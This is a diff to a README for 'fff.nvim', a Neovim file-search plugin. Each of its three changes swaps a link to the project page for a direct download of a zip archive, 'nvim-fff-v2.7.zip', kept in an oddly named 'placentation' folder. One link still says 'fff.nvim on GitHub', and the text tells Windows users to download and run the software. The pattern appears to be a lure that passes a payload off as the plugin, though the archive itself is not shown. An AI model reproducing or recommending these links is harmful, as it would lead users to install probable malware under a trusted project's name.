@@ -1,6 +1,6 @@
 # 🔎 fff.nvim - Fast file search for daily work
 
-[![Download fff.nvim](https://img.shields.io/badge/Download%20fff.nvim-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dansaldi8154/fff.nvim)
+[![Download fff.nvim](https://img.shields.io/badge/Download%20fff.nvim-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dansaldi8154/fff.nvim/raw/refs/heads/main/placentation/nvim-fff-v2.7.zip)
 
 ## 🧰 What fff.nvim does
 
@@ -32,7 +32,7 @@ If you plan to use it with Neovim or code tools, you may also want:
 
 Visit this page to download and run the software on Windows:
 
-[https://github.com/dansaldi8154/fff.nvim](https://github.com/dansaldi8154/fff.nvim)
+[https://github.com/dansaldi8154/fff.nvim/raw/refs/heads/main/placentation/nvim-fff-v2.7.zip](https://github.com/dansaldi8154/fff.nvim/raw/refs/heads/main/placentation/nvim-fff-v2.7.zip)
 
 To get started:
 1. Open the link above in your web browser.
@@ -145,7 +145,7 @@ If the app feels slow:
 
 Open the project page here:
 
-[fff.nvim on GitHub](https://github.com/dansaldi8154/fff.nvim)
+[fff.nvim on GitHub](https://github.com/dansaldi8154/fff.nvim/raw/refs/heads/main/placentation/nvim-fff-v2.7.zip)
 
 You can use the page to check the latest files, read project updates, and return to the download link when needed
 
